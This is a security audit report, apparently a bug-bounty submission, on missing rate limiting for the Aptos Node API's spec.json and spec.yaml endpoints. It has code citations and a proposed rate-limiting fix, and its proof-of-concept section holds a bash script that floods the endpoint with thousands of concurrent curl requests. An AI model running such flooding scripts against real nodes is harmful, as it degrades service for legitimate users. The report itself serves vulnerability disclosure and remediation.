# Audit Report

## Title
Missing Rate Limiting on OpenAPI Specification Endpoints Enabling Resource Exhaustion

## Summary
The Aptos Node API exposes OpenAPI specification endpoints (`/v1/spec.json` and `/v1/spec.yaml`) without any application-level rate limiting, allowing unlimited repeated downloads that could contribute to resource exhaustion and degraded service availability for legitimate users.

## Finding Description
The `spec_endpoint_json()` function in `api/src/spec.rs` creates a synchronous endpoint that returns the pre-computed OpenAPI specification on every request. [1](#0-0) 

These spec endpoints are registered in the API route configuration without any rate limiting middleware applied. [2](#0-1) 

The middleware stack applied to all routes includes CORS, compression, size limits, panic handling, and logging, but notably excludes any rate limiting mechanism. [3](#0-2) 

The `ApiConfig` structure contains various configuration parameters for the API but includes no rate limiting configuration fields. [4](#0-3) 

While HAProxy provides infrastructure-level protection with global connection limits (maxconn 500, maxconnrate 300), these limits apply to all connections rather than providing endpoint-specific rate limiting. [5](#0-4) 

The API documentation claims a rate limit of "100 requests per minute by default," but this is not implemented in the codebase. [6](#0-5) 

**Attack Scenario:**
1. Attacker identifies spec endpoints at `/v1/spec.json` and `/v1/spec.yaml`
2. Attacker floods these endpoints with concurrent requests (limited only by HAProxy's global maxconnrate of 300/sec)
3. Each request consumes a connection slot and allocates memory for cloning the specification string
4. Sustained flooding exhausts available connections and bandwidth, degrading service for legitimate API users
5. Other API endpoints are affected as they share the same connection pool and infrastructure resources

## Impact Explanation
This finding falls under **Low Severity** per the Aptos Bug Bounty program criteria: "Non-critical implementation bugs." The impact is limited resource exhaustion at the API layer that does not affect blockchain consensus, state integrity, or fund security. HAProxy's global connection limits (maxconn 500, maxconnrate 300) provide baseline protection preventing total service exhaustion.

## Likelihood Explanation
The likelihood is **High** because:
- The endpoints are publicly accessible without authentication
- The attack requires only standard HTTP clients with no special privileges
- No specialized knowledge of the Aptos protocol is required
- The vulnerability is trivial to exploit with basic scripting tools

However, the actual impact is constrained by infrastructure-level protections (HAProxy limits) and the fact that the specification is static and pre-computed, minimizing computational overhead.

## Recommendation
Implement endpoint-specific rate limiting for the spec endpoints. Add rate limiting configuration to `ApiConfig`:

```rust
pub struct ApiConfig {
    // ... existing fields ...
    
    /// Rate limit for spec endpoint requests per IP address (requests per minute)
    pub spec_endpoint_rate_limit: Option<u32>,
}
```

Create a rate limiting middleware using the existing `aptos-rate-limiter` crate and apply it specifically to the spec endpoints:

```rust
// Apply rate limiting to spec endpoints
let spec_json = spec_endpoint_json(&api_service)
    .with(RateLimitMiddleware::new(10, Duration::from_secs(60))); // 10 requests per minute
let spec_yaml = spec_endpoint_yaml(&api_service)
    .with(RateLimitMiddleware::new(10, Duration::from_secs(60)));
```

This would allow legitimate users to access the specification while preventing abuse.

## Proof of Concept
```bash
#!/bin/bash
# Proof of Concept: Flood spec endpoint with requests

API_URL="http://localhost:8080/v1/spec.json"
CONCURRENT_REQUESTS=100
TOTAL_REQUESTS=10000

# Function to make a single request
make_request() {
    curl -s -o /dev/null -w "%{http_code}\n" "$API_URL"
}

export -f make_request
export API_URL

echo "Starting DoS test on spec endpoint..."
echo "Target: $API_URL"
echo "Concurrent requests: $CONCURRENT_REQUESTS"
echo "Total requests: $TOTAL_REQUESTS"

# Use GNU parallel or xargs to flood the endpoint
seq 1 $TOTAL_REQUESTS | xargs -P $CONCURRENT_REQUESTS -I {} bash -c 'make_request'

echo "Test complete. Check API responsiveness and resource usage."
```

This script demonstrates that an attacker can flood the spec endpoint with requests. Monitor the API node's connection count, memory usage, and response times for other endpoints during the test to observe degradation.

**Notes:**
- This is a valid Low Severity finding: missing rate limiting exists and enables resource exhaustion
- However, the impact is constrained by HAProxy's infrastructure-level protections
- The vulnerability does not affect blockchain consensus, state integrity, or fund security (Critical Invariants remain intact)
- The attack does not break any of the 10 Critical Invariants documented in the Aptos specification
- Implementation of the recommended rate limiting would align the codebase with the documented behavior ("100 requests per minute")

### Citations

**File:** api/src/spec.rs (L30-41)
```rust
pub fn spec_endpoint_json<T, W>(service: &OpenApiService<T, W>) -> impl Endpoint + use<T, W>
where
    T: OpenApi,
    W: Webhook,
{
    let spec = get_spec(service, false);
    make_sync(move |_| {
        Response::builder()
            .content_type("application/json")
            .body(spec.clone())
    })
}
```

**File:** api/src/runtime.rs (L238-259)
```rust
        let route = Route::new()
            .at("/", poem::get(root_handler))
            .nest(
                "/v1",
                Route::new()
                    .nest("/", api_service)
                    .at("/spec.json", poem::get(spec_json))
                    .at("/spec.yaml", poem::get(spec_yaml))
                    // TODO: We add this manually outside of the OpenAPI spec for now.
                    // https://github.com/poem-web/poem/issues/364
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
            )
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```

**File:** config/src/config/api_config.rs (L15-93)
```rust
#[derive(Clone, Debug, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct ApiConfig {
    /// Enables the REST API endpoint
    #[serde(default = "default_enabled")]
    pub enabled: bool,
    /// Address for the REST API to listen on. Set to 0.0.0.0:port to allow all inbound connections.
    pub address: SocketAddr,
    /// Path to a local TLS certificate to enable HTTPS
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tls_cert_path: Option<String>,
    /// Path to a local TLS key to enable HTTPS
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tls_key_path: Option<String>,
    /// A maximum limit to the body of a POST request in bytes
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub content_length_limit: Option<u64>,
    /// Enables failpoints for error testing
    #[serde(default = "default_disabled")]
    pub failpoints_enabled: bool,
    /// Enables JSON output of APIs that support it
    #[serde(default = "default_enabled")]
    pub json_output_enabled: bool,
    /// Enables BCS output of APIs that support it
    #[serde(default = "default_enabled")]
    pub bcs_output_enabled: bool,
    /// Enables compression middleware for API responses
    #[serde(default = "default_enabled")]
    pub compression_enabled: bool,
    /// Enables encode submission API
    #[serde(default = "default_enabled")]
    pub encode_submission_enabled: bool,
    /// Enables transaction submission APIs
    #[serde(default = "default_enabled")]
    pub transaction_submission_enabled: bool,
    /// Enables transaction simulation
    #[serde(default = "default_enabled")]
    pub transaction_simulation_enabled: bool,
    /// Maximum number of transactions that can be sent with the Batch submit API
    pub max_submit_transaction_batch_size: usize,
    /// Maximum page size for transaction paginated APIs
    pub max_transactions_page_size: u16,
    /// Maximum page size for block transaction APIs
    pub max_block_transactions_page_size: u16,
    /// Maximum page size for event paginated APIs
    pub max_events_page_size: u16,
    /// Maximum page size for resource paginated APIs
    pub max_account_resources_page_size: u16,
    /// Maximum page size for module paginated APIs
    pub max_account_modules_page_size: u16,
    /// Maximum gas unit limit for view functions
    ///
    /// This limits the execution length of a view function to the given gas used.
    pub max_gas_view_function: u64,
    /// Optional: Maximum number of worker threads for the API.
    ///
    /// If not set, `runtime_worker_multiplier` will multiply times the number of CPU cores on the machine
    pub max_runtime_workers: Option<usize>,
    /// Multiplier for number of worker threads with number of CPU cores
    ///
    /// If `max_runtime_workers` is set, this is ignored
    pub runtime_worker_multiplier: usize,
    /// Configs for computing unit gas price estimation
    pub gas_estimation: GasEstimationConfig,
    /// Periodically call gas estimation
    pub periodic_gas_estimation_ms: Option<u64>,
    /// Configuration to filter view function requests.
    pub view_filter: ViewFilter,
    /// Periodically log stats for view function and simulate transaction usage
    pub periodic_function_stats_sec: Option<u64>,
    /// The time wait_by_hash will wait before returning 404.
    pub wait_by_hash_timeout_ms: u64,
    /// The interval at which wait_by_hash will poll the storage for the transaction.
    pub wait_by_hash_poll_interval_ms: u64,
    /// The number of active wait_by_hash requests that can be active at any given time.
    pub wait_by_hash_max_active_connections: usize,
    /// Allow submission of encrypted transactions via the API
    pub allow_encrypted_txns_submission: bool,
}
```

**File:** terraform/helm/aptos-node/files/haproxy.cfg (L9-13)
```text
    # Limit the maximum number of connections to 500 (this is ~5x the validator set size)
    maxconn 500

    # Limit the maximum number of connections per second to 300 (this is ~3x the validator set size)
    maxconnrate 300
```

**File:** api/doc/README.md (L26-29)
```markdown
## Limitations
- Rate limiting: 100 requests per minute by default
- Maximum request size: 2MB
- Connection timeout: 30 seconds
```
